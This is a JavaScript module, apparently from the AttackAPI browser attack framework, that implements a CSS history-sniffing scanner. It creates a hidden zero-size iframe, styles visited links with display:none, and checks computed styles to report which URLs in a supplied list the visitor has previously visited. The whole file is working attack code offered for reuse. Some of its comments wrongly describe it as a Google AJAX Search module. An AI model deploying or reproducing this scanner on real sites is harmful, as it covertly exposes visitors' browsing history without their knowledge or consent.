
/**
 * @name AttackAPI.Util['::DOM::CSS History Scanner']
 * @desc perform search via Google AJAX Search API
 * @extend AttackAPI.Util['::DOM']
 */
AttackAPI.Util['::DOM::CSS History Scanner'] = AttackAPI.Util['::DOM'].extend({
	/**
	 * @name AttackAPI.Util['::DOM::Google AJAX Search'].prototype.scan
	 * @desc perform the scan
	 * @param Array u array of URLs to scan
	 */
	scan: function (u) {
		var ifr = window.document.createElement('iframe');
		ifr.style.visibility = 'hidden';
		ifr.style.width = ifr.style.height = 0;
		
		window.document.body.appendChild(ifr);
		
		var d = this.getDoc(ifr);
		d.open();
		d.write('<style>a:visited{display: none}</style>');
		d.close();
		
		for (var i = 0; i < u.length; i++) {
			var a = d.createElement('a');
			a.href = u[i];
			
			d.body.appendChild(a);
			
			if (a.currentStyle) {
				var display = a.currentStyle['display'];
			} else {
				var display = d.defaultView.getComputedStyle(a, null).getPropertyValue('display');
			}
			
			if (display == 'none' && typeof(this.onfound) == 'function') {
				this.onfound(u[i], u);
			}
		}
		
		window.document.body.removeChild(ifr);
		
		if (typeof(this.oncomplete) == 'function') {
			this.oncomplete(u);
		}
	}
});